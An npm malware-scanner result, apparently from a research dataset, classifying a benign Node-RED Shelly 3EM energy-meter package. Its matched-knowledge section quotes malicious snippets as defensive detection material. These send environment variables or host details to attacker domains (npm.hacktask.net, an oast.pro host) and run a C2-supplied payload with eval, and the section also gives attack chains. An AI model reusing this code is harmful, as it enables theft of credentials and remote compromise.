@@ -1,0 +1,548 @@
+{
+  "package_name": "@zebrajaeger##node-red-contrib-shelly-3em",
+  "package_version": "2.0.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:46:36.273049",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/nodes/luxon.js",
+    "package/nodes/shelly_3em.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@zebrajaeger##node-red-contrib-shelly-3em/2.0.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@zebrajaeger##node-red-contrib-shelly-3em/2.0.1/package/nodes/luxon.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@zebrajaeger##node-red-contrib-shelly-3em/2.0.1/package/nodes/shelly_3em.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "shelly_3em_slice_1",
+          "code_snippet": "const { DateTime } = require(\"./luxon.js\");\n\nfunction isEmpty(value) {\n    return (value == null || (typeof value === \"string\" && value.trim().length === 0));\n}\n\nmodule.exports = function (RED) {\n    function Shelly_3EM(config) {\n        RED.nodes.createNode(this, config);\n        var node = this;\n\n        node.name = config.name;\n        node.url = config.url;\n        node.intervalMs = parseInt(config.intervalMs);\n\n        node.dayId = this.context().get('dayId');\n        node.dayStartValues = node.context().get('dayStartValues');\n\n        node.hourId = this.context().get('hourId');\n        node.hourStartValues = node.context().get('hourStartValues');\n\n        node.minuteId = this.context().get('minuteId');\n        node.minuteStartValues = node.context().get('minuteStartValues');\n\n        var timer = setInterval(() => {\n            fetch(node.url).then(res => {\n                if (!res.ok) {\n                    node.error({ status: res.status, msg: res.statusText });\n                    return;\n                }\n\n                return res.json();\n            }).then(data => {\n                if (!data) {\n                    node.error('No data');\n                    return;\n                }\n\n                // Get emeter data\n                const emeters = data.emeters;\n                if (!emeters || emeters.length < 3) {\n                    node.error(\"Unexpected emeters data\", data);\n                    return;\n                }\n\n                // Get time with or without timezone\n                const now = isEmpty(node.zone) ? DateTime.now() : DateTime.now().setZone(node.zone);\n                const dayPayload = makeDayPaload(now, emeters);\n                const hourPayload = makeHourPayload(now, emeters);\n                const minutePayload = makeMinutePayload(now, emeters);\n                const continousPayload = makeContinousPayload(now, emeters, data);\n\n                // console.log(payload)\n                node.send([\n                    { payload: continousPayload },\n                    dayPayload ? { payload: dayPayload } : null,\n                    hourPayload ? { payload: hourPayload } : null,\n                    minutePayload ? { payload: minutePayload } : null\n                ]);\n\n            }).catch(e => {\n                node.error(\"Failed\", e);\n            })\n        }, node.intervalMs);\n\n        this.on('close', function () {\n            if (timer) {\n                clearInterval(timer);\n                timer = undefined;\n            }\n        });\n\n        function makeContinousPayload(now, emeters, data) {\n            const continousPayload = {\n                date: now.toISO(),\n                dayId: node.dayId,\n                L1: emeters[0],\n                L2: emeters[1],\n                L3: emeters[2],\n                total_power: data.total_power\n            };\n\n            // add day energy\n            continousPayload.L1.total_day = emeters[0].total - node.dayStartValues.L1;\n            continousPayload.L2.total_day = emeters[1].total - node.dayStartValues.L2;\n            continousPayload.L3.total_day = emeters[2].total - node.dayStartValues.L3;\n            continousPayload.total_day = continousPayload.L1.total_day\n                + continousPayload.L2.total_day\n                + continousPayload.L3.total_day;\n            return continousPayload;\n        }\n\n        function makeDayPaload(now, emeters) {\n            var dayPayload = undefined;\n            const dayId = now.startOf('day').toISO();\n            if (dayId !== node.dayId) {\n                node.dayId = dayId;\n                node.context().set('dayId', node.dayId);\n\n                if (node.dayStartValues) {\n                    dayPayload = {\n                        date: now.minus({ days: 1 }).startOf('day').toISO(),\n                        L1: emeters[0].total - node.dayStartValues.L1,\n                        L2: emeters[1].total - node.dayStartValues.L2,\n                        L3: emeters[2].total - node.dayStartValues.L3\n                    };\n                }\n\n                node.dayStartValues = { L1: emeters[0].total, L2: emeters[1].total, L3: emeters[2].total };\n                node.context().set('dayStartValues', node.dayStartValues);\n            }\n            return dayPayload;\n        }\n        \n        function makeHourPayload(now, emeters) {\n            const hourId = now.startOf('hour').toISO();\n            var hourPayload = undefined;\n            if (hourId !== node.hourId) {\n                node.hourId = hourId;\n                node.context().set('hourId', node.hourId);\n\n                if (node.hourStartValues) {\n                    hourPayload = {\n                        date: now.minus({ hours: 1 }).startOf('hour').toISO(),\n                        L1: emeters[0].total - node.hourStartValues.L1,\n                        L2: emeters[1].total - node.hourStartValues.L2,\n                        L3: emeters[2].total - node.hourStartValues.L3\n                    };\n                }\n\n                node.hourStartValues = { L1: emeters[0].total, L2: emeters[1].total, L3: emeters[2].total };\n                node.context().set('hourStartValues', node.hourStartValues);\n            }\n            return hourPayload;\n        }\n\n        function makeMinutePayload(now, emeters) {\n            const minuteId = now.startOf('minute').toISO();\n            var minutePayload = undefined;\n            if (minuteId !== node.minuteId) {\n                node.minuteId = minuteId;\n                node.context().set('minuteId', node.minuteId);\n\n                if (node.minuteStartValues) {\n                    minutePayload = {\n                        date: now.minus({ minutes: 1 }).startOf('minute').toISO(),\n                        L1: emeters[0].total - node.minuteStartValues.L1,\n                        L2: emeters[1].total - node.minuteStartValues.L2,\n                        L3: emeters[2].total - node.minuteStartValues.L3\n                    };\n                }\n\n                node.minuteStartValues = { L1: emeters[0].total, L2: emeters[1].total, L3: emeters[2].total };\n                node.context().set('minuteStartValues', node.minuteStartValues);\n            }\n            return minutePayload;\n        }\n    }\n\n    RED.nodes.registerType(\"Shelly_3EM\", Shelly_3EM);\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.48824156721433004,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code accesses a configurable URL via the fetch API to retrieve JSON data containing energy meter readings, processes this data to compute continuous, daily, hourly, and minute-based payloads, and sends these payloads downstream via node.send. The data flow involves network communication to the URL specified in the configuration (node.url), which may be a hardcoded or user-supplied external endpoint, enabling potential data exfiltration of energy consumption metrics. This behavior facilitates periodic remote data collection and transmission, which could be leveraged for unauthorized monitoring or data leakage if the URL points to an attacker-controlled server.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Node-RED node module designed to periodically fetch energy meter data from a configurable URL, process it, and send structured payloads downstream. While it performs repeated network requests to an external URL, this behavior aligns with legitimate data collection and monitoring use cases rather than malicious exfiltration. There is no evidence of obfuscation, encrypted payloads, remote code execution, or unauthorized system information gathering. The code does not collect sensitive host or user environment data beyond the energy meter readings it is designed to handle. The periodic fetch and data processing pattern superficially resembles Example 1's use of setInterval for repeated execution, but the intent and data involved differ significantly. No suspicious system APIs or covert data exfiltration mechanisms are present. Therefore, despite some superficial similarity to known malicious patterns involving periodic network communication, this code is best classified as benign with low suspicion.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456658_snippet_5",
+              "source_package": "electorn (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456658/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5122677087783813,
+              "code_similarity": 0.4297563433647156,
+              "behavior_similarity": 0.5947790741920471,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "setInterval(update, 3600000); // For electorn (every hour)\n// For loadyaml: setInterval(update, 1800000); // every 30 minutes",
+                "code_behavior": "During preinstall, the code schedules the update function to execute every hour (for electorn) or every 30 minutes (for loadyaml), repeatedly collecting and exfiltrating user and device data to the attacker's endpoint, resulting in persistent unauthorized data leakage.",
+                "malice_analysis": {
+                  "why_suspicious": "Persistence and repeated exfiltration of sensitive data significantly increase the risk and impact of the attack, enabling ongoing surveillance and data theft.",
+                  "violated_expectations": "Legitimate packages do not persistently run background data collection or exfiltration routines after installation.",
+                  "similar_legitimate_use": "Some updaters or telemetry agents may run periodically, but not for exfiltrating sensitive user or device data without consent.",
+                  "key_indicators": [
+                    "setInterval for periodic execution of malicious function",
+                    "Repeated network exfiltration of user/device data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via update.js, recurring)",
+                  "file_location": "update.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "electorn",
+                  "package_manager": "npm",
+                  "package_versions": "10.0.0",
+                  "why_malicious": "The package is a typosquat of the legitimate 'electron' package and contains malicious code that, during installation, collects sensitive user and device information (such as IP address, geolocation, username, home directory, CPU model, and machine ID) and exfiltrates it to a public GitHub issue via the GitHub API. This results in unauthorized public exposure of user data and is not expected or acceptable behavior in legitimate packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package (typosquatting on 'electron' or 'loadyaml').",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Triggers execution of update.js via preinstall script."
+                  },
+                  {
+                    "step": 2,
+                    "action": "update.js collects device fingerprinting information (username, home directory, CPU model, machine ID).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "update.js fetches the user's public IP address and geolocation data from ifconfig.co.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Combines geolocation with device fingerprint."
+                  },
+                  {
+                    "step": 4,
+                    "action": "update.js posts the collected data to a public GitHub issue via the GitHub API.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sensitive data is exposed publicly."
+                  },
+                  {
+                    "step": 5,
+                    "action": "update.js schedules itself to repeat the data collection and exfiltration every hour (electorn) or every 30 minutes (loadyaml).",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Continuous exfiltration and exposure of user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of background scripts via npm preinstall",
+                    "Collection of device fingerprinting information (username, home directory, CPU model, machine ID) during installation",
+                    "Network requests to IP geolocation services (e.g., ifconfig.co/json) at install-time",
+                    "Network requests to api.github.com with POST method containing sensitive data in the body",
+                    "Persistence via setInterval for repeated execution of data exfiltration routines"
+                  ],
+                  "file_indicators": [
+                    "Presence of update.js with obfuscated or minified code",
+                    "package.json with preinstall script launching background process (e.g., 'node update.js &')",
+                    "Base64-encoded strings representing URLs or API endpoints within JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to ifconfig.co or similar geolocation APIs",
+                    "Outbound POST requests to api.github.com/repos/*/issues/*/comments with sensitive data"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that launch background processes. Flag packages that collect device or user information or make network requests to external services (especially ifconfig.co or api.github.com) during installation. Scan for base64-encoded URLs or endpoints in package scripts. Detect repeated background execution (setInterval) and exfiltration of data to public endpoints. Review package.json for suspicious scripts and dependencies. Correlate file, network, and behavioral indicators to identify malicious persistence and data exfiltration."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_4",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47972261905670166,
+              "code_similarity": 0.4094219207763672,
+              "behavior_similarity": 0.5500233173370361,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "function heartbeat(){\n    const requestData = {\n        hostname: os.hostname(),\n        uuid:machineIdSync({original: true}),\n        os:os.platform(),\n    };\n    sendRequest(url+'/api/index',aesEncrypt(JSON.stringify(requestData)))\n    const task = {\n        uuid:machineIdSync({original: true}),\n    }\n    sendRequest(url+'/api/captcha',aesEncrypt(JSON.stringify(task))).then(result => {\n        try{\n            if (result !== undefined) {\n                const data = JSON.parse(result);\n                const decodedData = Buffer.from(data.code, 'base64').toString();\n                eval(decodedData)\n            }\n        }catch (error){\n        }\n    });\n}",
+                "code_behavior": "Every 45 seconds at runtime, the code collects host and machine identifiers, encrypts them, and sends them to the C2 server; it then receives an encrypted payload, decodes and executes it using eval, enabling remote code execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Periodic exfiltration of host info and execution of remote, attacker-supplied code is highly malicious and enables full compromise of the victim system.",
+                  "violated_expectations": "Legitimate packages do not beacon to remote servers or execute arbitrary code received from the network.",
+                  "similar_legitimate_use": "Heartbeat mechanisms are used in legitimate monitoring agents, but never to execute arbitrary code from untrusted sources.",
+                  "key_indicators": [
+                    "periodic network beaconing to C2 server",
+                    "encrypted payload delivery and execution via eval",
+                    "exfiltration of host and machine identifiers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (daemonized by pm2)",
+                  "file_location": "app.js (heartbeat function)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455419_snippet_2",
+              "source_package": "['@zettle-bo/account-settings', '@zettle-bo/account-statement', '@zettle-bo/apps', '@zettle-bo/bank-settings', '@zettle-bo/bootstrapper', '@zettle-bo/capital', '@zettle-bo/cash-register', '@zettle-bo/customers', '@zettle-bo/dashboard', '@zettle-bo/direct-debit', '@zettle-bo/integrations', '@zettle-bo/inventory', '@zettle-bo/invoices', '@zettle-bo/pp-profile-widget', '@zettle-bo/products', '@zettle-bo/react', '@zettle-bo/react-router-dom', '@zettle-bo/react-spa', '@zettle-bo/receipts', '@zettle-bo/routes', '@zettle-bo/sales-trends', '@zettle-bo/settings', '@zettle-bo/shell', '@zettle-bo/staff-account', '@zettle-bo/vertical-navigation', 'airbn-geetest3', 'airbnb-env', 'airbnb-erf', 'airbnb-i18n-polyglot', 'airbnb-l10n', 'airbnb-mediator', 'airbnb-moment-more-format'] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455419/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4778602719306946,
+              "code_similarity": 0.38581112027168274,
+              "behavior_similarity": 0.5699094533920288,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//author-- whitehacker003@protonmail.com\nconst os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst trackingData = JSON.stringify({\n  p: packageJSON.name,\n  c: os.cpus(),\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: dns.getServers(),\n  r: packageJSON.__resolved,\n  v: packageJSON.version,\n  json: packageJSON,\n});\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\nvar options = {\n  hostname: 'cj56jbj5dpjnojrhvbp2t4fnmokpu14.oast.pro',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time, the code collects detailed system and environment information (CPU details, home directory, hostname, username, DNS servers, and package metadata), serializes it, and sends it via HTTPS POST to an external domain, resulting in exfiltration of sensitive host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive system and environment information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent. This enables reconnaissance of internal environments and can facilitate further targeted attacks.",
+                  "violated_expectations": "Legitimate packages do not collect and transmit host or environment information on import, especially to untrusted domains, and always require user consent for telemetry.",
+                  "similar_legitimate_use": "Some analytics or error reporting packages may collect limited telemetry, but this is always documented, opt-in, and never includes sensitive host details like usernames or DNS servers.",
+                  "key_indicators": [
+                    "Collection of sensitive system and environment data (CPU, home directory, hostname, username, DNS servers)",
+                    "Network exfiltration via HTTPS POST to non-standard domain (oast.pro)",
+                    "No user notification or consent for data collection or transmission",
+                    "Presence of code referencing os, dns, and process environment in package entry point"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (airbnb packages)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": [
+                    "@zettle-bo/account-settings",
+                    "@zettle-bo/account-statement",
+                    "@zettle-bo/apps",
+                    "@zettle-bo/bank-settings",
+                    "@zettle-bo/bootstrapper",
+                    "@zettle-bo/capital",
+                    "@zettle-bo/cash-register",
+                    "@zettle-bo/customers",
+                    "@zettle-bo/dashboard",
+                    "@zettle-bo/direct-debit",
+                    "@zettle-bo/integrations",
+                    "@zettle-bo/inventory",
+                    "@zettle-bo/invoices",
+                    "@zettle-bo/pp-profile-widget",
+                    "@zettle-bo/products",
+                    "@zettle-bo/react",
+                    "@zettle-bo/react-router-dom",
+                    "@zettle-bo/react-spa",
+                    "@zettle-bo/receipts",
+                    "@zettle-bo/routes",
+                    "@zettle-bo/sales-trends",
+                    "@zettle-bo/settings",
+                    "@zettle-bo/shell",
+                    "@zettle-bo/staff-account",
+                    "@zettle-bo/vertical-navigation",
+                    "airbn-geetest3",
+                    "airbnb-env",
+                    "airbnb-erf",
+                    "airbnb-i18n-polyglot",
+                    "airbnb-l10n",
+                    "airbnb-mediator",
+                    "airbnb-moment-more-format"
+                  ],
+                  "package_manager": "npm",
+                  "package_versions": "35.0.0 (zettle-bo packages), 1.0.0 (airbnb packages, assumed)",
+                  "why_malicious": "These packages are proof-of-concept (PoC) dependency confusion attacks that attempt to exfiltrate system information or download and execute code from external servers. While no outright malicious payload is present, the behavior is consistent with supply chain attack techniques and poses a risk to internal systems if installed. The packages make unsolicited network requests during installation or import, which can be used to confirm internal usage or leak sensitive environment data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed via dependency confusion, replacing or supplementing an internal package with an attacker-controlled version.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall or import-time code embedded in the malicious package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation or import, performing network beaconing or exfiltrating system information to external servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives confirmation of internal package usage or detailed system data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses the received confirmation or exfiltrated data for internal reconnaissance or as proof-of-concept for supply chain compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Final goal: enable further targeted attacks or demonstrate internal exposure"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited network requests to external domains during package installation (postinstall) or import",
+                    "Collection and exfiltration of system environment data (CPU, home directory, hostname, username, DNS servers) at import-time",
+                    "Use of package name in remote URLs as part of network beaconing (dependency confusion indicator)",
+                    "Presence of code in entry points that references os, dns, or process environment modules"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js or index.js in package root containing network request code",
+                    "References to external domains such as *.lupin.com or *.oast.pro in package source files",
+                    "Use of os, dns, or process environment modules in package entry points",
+                    "Presence of postinstall scripts or code in package.json or main entry files"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to domains matching *.lupin.com during installation",
+                    "HTTPS POST requests to domains matching *.oast.pro containing serialized system metadata",
+                    "Outbound connections to non-standard or attacker-controlled domains at install or import time"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests to external or non-standard domains during installation (postinstall) or import. Use static analysis to flag packages whose entry points (e.g., app.js, index.js) reference os, dns, or process environment modules and contain code for network exfiltration. Block or alert on packages with postinstall scripts or code that contacts external servers using the package name. Inspect network logs for HTTP/HTTPS requests to domains such as *.lupin.com and *.oast.pro, especially if requests contain serialized system or environment data."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780687_snippet_2",
+              "source_package": "web3_nextjs_backend (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780687/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4699435830116272,
+              "code_similarity": 0.3231750726699829,
+              "behavior_similarity": 0.6167120933532715,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "fetch('https://flickthebean.onrender.com', { method: 'POST', body: JSON.stringify({ ... }) });",
+                "code_behavior": "At runtime, the code sends collected data via HTTPS POST requests to the external domain 'flickthebean.onrender.com', transferring potentially sensitive information such as wallet secrets or environment variables to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "Outbound network requests to a hardcoded, unrelated external domain are highly suspicious, especially when transmitting sensitive data without user knowledge or consent.",
+                  "violated_expectations": "Legitimate code should not exfiltrate user or environment data to third-party domains without explicit user consent and clear documentation. Sensitive data should never be sent to untrusted endpoints.",
+                  "similar_legitimate_use": "Telemetry or analytics code may send non-sensitive usage data to trusted domains, but should never transmit secrets or wallet information, and must always inform the user.",
+                  "key_indicators": [
+                    "Hardcoded external domain in network request",
+                    "HTTPS POST requests with sensitive payloads",
+                    "No user notification or consent for data transmission",
+                    "Domain (flickthebean.onrender.com) unrelated to project purpose"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "various files in web3_nextjs (frontend and backend)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "web3_nextjs_backend",
+                  "package_manager": "npm",
+                  "package_versions": "GitHub-only, not published to npmjs.com",
+                  "why_malicious": "The package contains code that opens a network port and listens for unauthenticated connections, enabling potential remote access or reverse shell attacks. It also exfiltrates sensitive data, such as crypto wallet secrets, by reading environment variables or local files and sending them to an external, attacker-controlled domain under the pretense of a job interview exercise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim clones and runs the backend and frontend npm projects locally as part of a job interview exercise.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Backend code opens TCP port 5000 and listens for incoming connections, potentially enabling remote access or reverse shell.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker may gain remote access to the victim's machine"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code accesses environment variables or local files to extract wallet information.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Sensitive wallet data is collected"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to an external domain via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives wallet secrets and can drain the victim's crypto wallet"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Backend code opening arbitrary network ports (e.g., 5000) without clear documentation or authentication",
+                    "Outbound HTTPS POST requests to suspicious or unrelated domains (e.g., flickthebean.onrender.com)",
+                    "Access to environment variables or local files containing wallet or secret information without user consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that listens on port 5000 in backend entry points (e.g., index.js, app.js)",
+                    "Hardcoded external domains in fetch or HTTP request code (e.g., flickthebean.onrender.com)",
+                    "References to wallet, MetaMask, or secret keys in code or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Connections to flickthebean.onrender.com",
+                    "Unusual outbound HTTPS traffic immediately after running npm projects",
+                    "Unexpected inbound connections to local port 5000"
+                  ],
+                  "how_to_detect": "Monitor for npm projects or local development servers that open unexpected network ports or accept unauthenticated connections. Flag code that makes outbound requests to untrusted or hardcoded domains, especially when transmitting environment variables or wallet secrets. Use static analysis to detect hardcoded domains and references to sensitive data, and dynamic analysis to observe runtime network and file access behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_788989_snippet_1",
+              "source_package": "mongose (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_788989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46992650628089905,
+              "code_similarity": 0.3777870535850525,
+              "behavior_similarity": 0.5620659589767456,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const http = require('http');\nconst data = JSON.stringify(process.env);\nconst options = {\n  hostname: 'npm.hacktask.net',\n  port: 80,\n  path: '/collect',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Content-Length': data.length\n  }\n};\nconst req = http.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code serializes all environment variables using JSON.stringify, sends them via HTTP POST to the hardcoded domain npm.hacktask.net, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables (process.env) and transmits them in bulk to an external, attacker-controlled server without user knowledge or consent. This is a direct credential exfiltration technique.",
+                  "violated_expectations": "Legitimate packages should not access or transmit the full set of environment variables, especially not to third-party or untrusted domains, and never without explicit user consent.",
+                  "similar_legitimate_use": "Some legitimate telemetry or error reporting tools may send limited, non-sensitive environment data for debugging, but never the entire environment or to untrusted, hardcoded domains.",
+                  "key_indicators": [
+                    "Access to process.env (full environment variable set)",
+                    "Serialization of environment variables into a JSON object",
+                    "HTTP POST request to hardcoded external domain (npm.hacktask.net)",
+                    "No user interaction or consent required",
+                    "Code executes automatically on import or runtime"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "index.js (main entrypoint of the package)",
+                  "required_permissions": [
+                    "read environment variables",
+                    "outbound network access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mongose",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions by HackTask (July 19, 2023)",
+                  "why_malicious": "These packages are typo-squatted versions of popular npm libraries. They contain additional code that, upon installation or import, exfiltrates all environment variables from the victim's system to an attacker-controlled server (npm.hacktask.net). This enables theft of sensitive credentials, API keys, and secrets, posing a significant supply chain risk."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Developer installs a typo-squatted malicious package (e.g., mongose) instead of the legitimate one.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is included in the project."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the project is run or built, the malicious code in the package's main entrypoint (index.js) executes automatically.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "All environment variables are collected from the running process."
+                  },
+                  {
+                    "step": 3,
